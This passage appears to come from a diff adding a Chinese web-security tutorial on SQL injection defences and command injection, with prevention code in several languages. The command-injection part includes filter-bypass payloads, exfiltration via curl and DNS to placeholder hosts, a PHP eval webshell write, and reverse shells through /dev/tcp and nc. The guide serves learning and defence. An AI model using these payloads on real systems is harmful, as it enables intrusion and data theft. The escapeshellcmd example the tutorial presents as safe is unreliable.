+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--random-agent</code>、<code class="language-plaintext highlighter-rouge">--proxy</code>、<code class="language-plaintext highlighter-rouge">--delay</code>、<code class="language-plaintext highlighter-rouge">--tamper</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">非标准响应</td>
+      <td style="text-align: left">无布尔差异、无时间差异</td>
+      <td style="text-align: left">转手工或调整判定条件</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">需要登录态</td>
+      <td style="text-align: left">未携带正确 Cookie</td>
+      <td style="text-align: left">用 <code class="language-plaintext highlighter-rouge">--cookie</code> 或 <code class="language-plaintext highlighter-rouge">-r</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">CSRF Token</td>
+      <td style="text-align: left">每次请求 token 变化</td>
+      <td style="text-align: left">需写脚本或配合 Burp</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">返回结果非标准</td>
+      <td style="text-align: left">有差异但 sqlmap 不识别的字段</td>
+      <td style="text-align: left">调 <code class="language-plaintext highlighter-rouge">--level</code> 或 <code class="language-plaintext highlighter-rouge">--string</code>/<code class="language-plaintext highlighter-rouge">--regexp</code> 指定特征</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="防御全面防死">防御（全面防死）</h4>
+
+<p><strong>原则</strong>：<strong>参数化 + 不使用动态拼接。永远不用动态字符串拼接构造SQL语句</strong>。</p>
+
+<p><strong>用预处理语句 + 参数绑定。</strong></p>
+
+<p><strong>防死写法1（PDO + 预处理语句）</strong>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE id = :id");
+$stmt-&gt;execute(['id' =&gt; $_GET['id']]);
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>防死写法2（MySQLi + 预处理）</strong>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>$stmt = $mysqli-&gt;prepare("SELECT * FROM users WHERE id = ?");
+$stmt-&gt;bind_param("i", $_GET['id']);
+$stmt-&gt;execute();
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><em>⚠️ 不要用 <code class="language-plaintext highlighter-rouge">mysqli_real_escape_string</code>，它不是防死的，只转义部分字符。</em></p>
+
+<p><strong>Python</strong></p>
+
+<p><strong>防死写法1（参数化查询）</strong>：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE id = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>ORM（更推荐）</strong>：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">User</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Java</strong></p>
+
+<p><strong>防死写法（PreparedStatement）</strong>：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nc">PreparedStatement</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="s">"SELECT * FROM users WHERE id = ?"</span><span class="o">);</span>
+<span class="n">ps</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">id</span><span class="o">);</span>
+<span class="nc">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">ps</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Node.js</strong></p>
+
+<p><strong>防死写法（参数化）</strong>：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nx">connection</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="dl">"</span><span class="s2">SELECT * FROM users WHERE id = ?</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">id</span><span class="p">],</span> <span class="nx">callback</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>ORM（Sequelize）</strong>：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nx">User</span><span class="p">.</span><span class="nf">findAll</span><span class="p">({</span> <span class="na">where</span><span class="p">:</span> <span class="p">{</span> <span class="na">id</span><span class="p">:</span> <span class="nx">id</span> <span class="p">}</span> <span class="p">});</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Go</strong></p>
+
+<p><strong>防死写法（占位符）</strong>：</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">db</span><span class="o">.</span><span class="n">Query</span><span class="p">(</span><span class="s">"SELECT * FROM users WHERE id = ?"</span><span class="p">,</span> <span class="n">id</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Ruby</strong></p>
+
+<p><strong>防死写法（占位符）</strong>：</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="no">User</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"id = ?"</span><span class="p">,</span> <span class="nb">id</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Rails ORM</strong>：</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="no">User</span><span class="p">.</span><span class="nf">find_by</span><span class="p">(</span><span class="ss">id: </span><span class="nb">id</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<h3 id="12-命令注入">1.2 命令注入</h3>
+
+<p>相关工具：burpsuite（某些场景）</p>
+
+<h4 id="信息收集">信息收集</h4>
+
+<p>首先是信息收集。哪里可以执行系统命令</p>
+
+<p><strong>关键</strong>：只要参数值最终被拼接到系统命令里，就可能存在命令注入。</p>
+
+<p>最常见的是 <code class="language-plaintext highlighter-rouge">ping</code> ，也可能是 <code class="language-plaintext highlighter-rouge">nslookup</code>、<code class="language-plaintext highlighter-rouge">traceroute</code>、<code class="language-plaintext highlighter-rouge">dig</code>、<code class="language-plaintext highlighter-rouge">grep</code>、<code class="language-plaintext highlighter-rouge">cat</code>、<code class="language-plaintext highlighter-rouge">tar</code> 等。这些注入方式及代码都是一样的。</p>
+
+<p>判断命令注入：<code class="language-plaintext highlighter-rouge">;</code> 、<code class="language-plaintext highlighter-rouge">|</code>、 <code class="language-plaintext highlighter-rouge">&amp;</code> 、<code class="language-plaintext highlighter-rouge">&amp;&amp;</code>、 <code class="language-plaintext highlighter-rouge">||</code>（终止当前命令作用，然后去执行后面的命令。如果回显用户即成功。）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ping 127.0.0.1<span class="p">;</span><span class="nb">whoami</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>如果以上常用的被过滤了，试试以下的绕过。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">方式</th>
+      <th style="text-align: left">符号</th>
+      <th style="text-align: left">说明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">换行符/回车符</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">%0a</code>/<code class="language-plaintext highlighter-rouge">%0d</code></td>
+      <td style="text-align: left">URL编码的换行，在某些解析中等于命令结束</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">命令替换（反引号）</td>
+      <td style="text-align: left">`whoami`</td>
+      <td style="text-align: left">里面命令执行完结果当参数</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">命令替换（现代）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">$(whoami) </code></td>
+      <td style="text-align: left">同上，更规范</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">换行二次编码</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">%250a</code></td>
+      <td style="text-align: left">WAF 只解码一次时</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">直接换行（HTTP请求中）</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: left">修改原始请求包插入 <code class="language-plaintext highlighter-rouge">\n</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">利用已有参数闭合</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: left">不引入新符号，利用参数值自然结束</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">文件描述符重定向</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">&gt;&amp;2</code> 等不依赖分隔符，需辅助外带数据</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>如果输入什么都没有反应，可能是需要闭合干扰命令（<code class="language-plaintext highlighter-rouge"> &gt; /dev/null</code>）</p>
+
+<p>输入：<code class="language-plaintext highlighter-rouge">8.8.8.8; whoami</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ping <span class="nt">-c</span> 4 8.8.8.8<span class="p">;</span> <span class="nb">whoami</span> <span class="o">&gt;</span> /dev/null <span class="c"># 执行了，但输出被扔进 /dev/null，页面没有输出</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>解决1</strong>：不让重定向生效（闭合）</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>8.8.8.8; whoami &gt; /dev/tty
+8.8.8.8; whoami 2&gt;&amp;1
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>执行：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ping <span class="nt">-c</span> 4 8.8.8.8 <span class="o">&gt;</span> /dev/null<span class="p">;</span> <span class="nb">whoami</span> <span class="o">&gt;</span> /dev/tty
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>解决2</strong>：不依赖回显</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>8.8.8.8; whoami | curl http://服务器地址
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>解决3</strong>：用万能方法——延时判断</p>
+
+<p>时间盲注在命令这里依然是万能的。</p>
+
+<p>当可以成功地进行注入命令时，进行下一步：找到过滤并绕过。</p>
+
+<h4 id="命令注入绕过">命令注入绕过</h4>
+
+<p><strong>1. 绕过“空格过滤”</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">替代方式</th>
+      <th style="text-align: left">示例 Payload</th>
+      <th style="text-align: left">说明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">${IFS}</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cat${IFS}/tmp/flag.txt</code></td>
+      <td style="text-align: left">IFS = Internal Field Separator</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">$IFS</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cat$IFS/tmp/flag.txt</code></td>
+      <td style="text-align: left">同上，但有时不解析，加 <code class="language-plaintext highlighter-rouge">${}</code> 更稳</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">{cmd,arg}</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">{cat,/tmp/flag.txt}</code></td>
+      <td style="text-align: left">花括号，逗号分隔</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">%09</code>（Tab）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cat%09/tmp/flag.txt</code></td>
+      <td style="text-align: left">URL编码的 Tab</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">%20</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cat%20/tmp/flag.txt</code></td>
+      <td style="text-align: left">URL编码的空格</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">&lt;</code> 或 <code class="language-plaintext highlighter-rouge">&lt;&gt;</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cat&lt;/tmp/flag.txt</code></td>
+      <td style="text-align: left">输入重定向</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cat&lt;&lt;&lt;/tmp/flag.txt</code></td>
+      <td style="text-align: left">将后面的字符串作为标准输入传给前面的命令</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>2. 绕过“关键字过滤”</strong></p>
+
+<p>方法1：换词</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat</code>、<code class="language-plaintext highlighter-rouge">tac</code>、<code class="language-plaintext highlighter-rouge">more</code>、<code class="language-plaintext highlighter-rouge">head</code>、<code class="language-plaintext highlighter-rouge">tail</code>、<code class="language-plaintext highlighter-rouge">nl</code>、<code class="language-plaintext highlighter-rouge">less</code>、<code class="language-plaintext highlighter-rouge">od</code>、<code class="language-plaintext highlighter-rouge">xxd</code>、<code class="language-plaintext highlighter-rouge">base64</code>、<code class="language-plaintext highlighter-rouge">rev</code></p>
+
+<p>方法2：通配符</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="c"># /tmp/flag.txt</span>
+<span class="nb">cat</span> /???/flag.txt
+
+<span class="c"># flag.txt</span>
+<span class="nb">cat</span> /???/fla?.txt
+<span class="nb">cat</span> /<span class="k">*</span>/f<span class="k">*</span>
+<span class="nb">cat</span> /???/????.???
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>方法3：反斜杠分词</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>c<span class="se">\a</span>t /tmp/fl<span class="se">\a</span>g.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>方法4：引号/双引号</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>c<span class="s1">''</span>at /tmp/flag.txt
+c<span class="s2">""</span>at /tmp/flag.txt
+<span class="s2">"c"</span>at /tmp/flag.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>方法5：命令拼接（<code class="language-plaintext highlighter-rouge">echo</code> + 管道）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="c"># 用 echo 输出命令，传给 bash</span>
+<span class="nb">echo cat</span> /tmp/flag.txt | bash
+<span class="nb">echo</span> <span class="s2">"cat /tmp/flag.txt"</span> | sh
+sh<span class="o">&lt;&lt;&lt;</span><span class="nb">cat</span> /tmp/flag.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><em>很多黑名单只拦“独立的命令”，不拦字符串内的单词。</em></p>
+
+<p>方法6：环境变量拼接</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="c"># 从环境变量里取字母拼成 cat</span>
+<span class="nv">X</span><span class="o">=</span><span class="s1">$'c'</span><span class="p">;</span><span class="nv">Y</span><span class="o">=</span><span class="s1">$'at'</span><span class="p">;</span><span class="nv">$X$Y</span> /tmp/flag.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>↓ 刁钻 ↓</p>
+
+<p>方法7：命令拼接 + 加密（比较稳）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">echo </span>Y2F0IC9ldGMvcGFzc3dk | <span class="nb">base64</span> <span class="nt">-d</span> | sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>方法8：利用 <code class="language-plaintext highlighter-rouge">awk</code>、<code class="language-plaintext highlighter-rouge">sed</code>、<code class="language-plaintext highlighter-rouge">grep</code>、<code class="language-plaintext highlighter-rouge">sort</code>、<code class="language-plaintext highlighter-rouge">uniq</code>、<code class="language-plaintext highlighter-rouge">tee</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="nb">awk</span> <span class="s1">'//'</span> /tmp/flag.txt
+<span class="nb">awk</span> <span class="s1">'{print}'</span> /tmp/flag.txt
+
+<span class="nb">sed</span> <span class="nt">-n</span> p /tmp/flag.txt
+
+<span class="nb">grep</span> <span class="s1">''</span> /tmp/flag.txt
+
+<span class="nb">sort</span> /tmp/flag.txt
+
+<span class="nb">uniq</span> /tmp/flag.txt
+
+<span class="nb">tee</span> /tmp/flag.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>方法9：利用 <code class="language-plaintext highlighter-rouge">xargs</code>、<code class="language-plaintext highlighter-rouge">find</code>（只读文件不递归）、<code class="language-plaintext highlighter-rouge">cp</code> 到 stdout（部分系统）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>xargs <span class="nt">-a</span> /tmp/flag.txt
+
+find <span class="nb">.</span> <span class="nt">-maxdepth</span> 0 <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> /tmp/flag.txt <span class="se">\;</span>
+find /tmp/flag.txt <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span>
+
+<span class="nb">cp</span> /tmp/flag.txt /dev/stdout
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>3. 绕过“无字母数字”</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>&lt;/???/??????.???
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/???</code> 匹配 <code class="language-plaintext highlighter-rouge">/tmp</code>，<code class="language-plaintext highlighter-rouge">/??????.???</code> 匹配 <code class="language-plaintext highlighter-rouge">flag.txt</code> → 整个变成 <code class="language-plaintext highlighter-rouge">/tmp/flag.txt</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt; /tmp/flag.txt</code> 表示“把这个文件内容作为标准输入”。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">*</span> /???/??????.???
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong><code class="language-plaintext highlighter-rouge">*</code> 先展开</strong>，</p>
+
+<p><code class="language-plaintext highlighter-rouge">*</code> 匹配当前目录下所有<strong>非隐藏文件名</strong>。</p>
+
+<p>假设当前目录只有一个文件叫 <code class="language-plaintext highlighter-rouge">cat</code>（或者 <code class="language-plaintext highlighter-rouge">sh</code>、<code class="language-plaintext highlighter-rouge">ls</code> 等），<code class="language-plaintext highlighter-rouge">*</code> 就会变成 <code class="language-plaintext highlighter-rouge">cat</code>。</p>
+
+<p>整体变成 <code class="language-plaintext highlighter-rouge">cat /tmp/flag.txt</code>。</p>
+
+<p>前提条件：当前目录下必须有一个可执行文件且这个文件能读文件（如 <code class="language-plaintext highlighter-rouge">cat</code>、<code class="language-plaintext highlighter-rouge">more</code>、<code class="language-plaintext highlighter-rouge">ls</code>、<code class="language-plaintext highlighter-rouge">head</code> 等）。</p>
+
+<h4 id="命令盲注">命令盲注</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> /tmp/flag.txt <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nb">sleep </span>5<span class="p">;</span> <span class="k">fi</span>
+<span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">cat</span> /tmp/flag.txt | <span class="nb">cut</span> <span class="nt">-c</span> 1<span class="si">)</span> <span class="o">=</span> <span class="s1">'f'</span> <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nb">sleep </span>5<span class="p">;</span> <span class="k">fi</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>但效率极低，实战很少这样猜。</p>
+
+<p>1. 写文件 + 回读</p>
+
+<p><strong>前提</strong>：在已知有可写目录的前提下</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">;</span> <span class="nb">cat</span> /tmp/flag.txt <span class="o">&gt;</span> /var/www/html/flag.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>2. DNS 外带（最长 255 字符）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">;</span> nslookup <span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>.your-dnslog.com
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>打开 DNSlog 平台 <a href="http://www.dnslog.cn/">DNSLog Platform</a>，能看到 <code class="language-plaintext highlighter-rouge">www-data.your-dnslog.com</code> 的解析请求。</p>
+
+<p>3. HTTP 外带（无长度限制）</p>
+
+<p><strong>前提</strong>：目标能联网，能访问你的 IP。</p>
+
+<p>先在自己的服务器上起监听：<code class="language-plaintext highlighter-rouge">nc -lvnp 8080</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">;</span> curl http://your-server:8080/<span class="si">$(</span><span class="nb">cat</span> /tmp/flag.txt | <span class="nb">base64</span><span class="si">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>目标机器执行 curl，把 flag 内容经过 base64 编码（避免特殊字符截断）发过来。</p>
+
+<p>4. 命令上传webshell</p>
+
+<p><strong>前提</strong>：在已知有可写目录的前提下</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'&lt;?php eval($_POST[cmd]);?&gt;'</span> | <span class="nb">tee</span> /var/www/html/shell.php
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>没有回显，但写完后你直接访问 <code class="language-plaintext highlighter-rouge">/shell.php</code>，用蚁剑/菜刀连接，就能执行命令（此时有回显了）。</p>
+
+<p>5. 反弹 Shell</p>
+
+<p><strong>前提</strong>：目标能访问你的 IP / 端口</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="p">;</span> bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1"</span>
+<span class="p">;</span> nc <span class="nt">-e</span> /bin/sh 10.0.0.1 4444
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="防御全面防死-1">防御（全面防死）</h4>
+
+<p><strong>原则</strong></p>
+
+<p>1. <strong>不拼</strong>：永远不要用字符串拼接构造系统命令。</p>
+
+<p>2. <strong>白名单</strong>：参数只能是预设值，不接受任意输入。</p>
+
+<p>3. <strong>换语言</strong>：用自带API替代系统调用。</p>
+
+<p><strong>PHP</strong></p>
+
+<p><strong>防死写法1（白名单）</strong>：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nv">$allowed</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'8.8.8.8'</span><span class="p">,</span> <span class="s1">'1.1.1.1'</span><span class="p">,</span> <span class="s1">'114.114.114.114'</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">],</span> <span class="nv">$allowed</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'invalid'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"ping -c 4 "</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>防死写法2（参数化，PHP7.4+）</strong>：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]);</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"ping -c 4 "</span> <span class="mf">.</span> <span class="nv">$cmd</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>防死写法3（不用系统命令）</strong>：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="c1">// 用PHP原生Socket替代ping</span>
+<span class="nv">$socket</span> <span class="o">=</span> <span class="nb">socket_create</span><span class="p">(</span><span class="no">AF_INET</span><span class="p">,</span> <span class="no">SOCK_RAW</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="c1">// ... 不展开，总之不要调system</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Python</strong></p>
+
+<p><strong>防死写法1（subprocess + list参数）</strong>：</p>
+
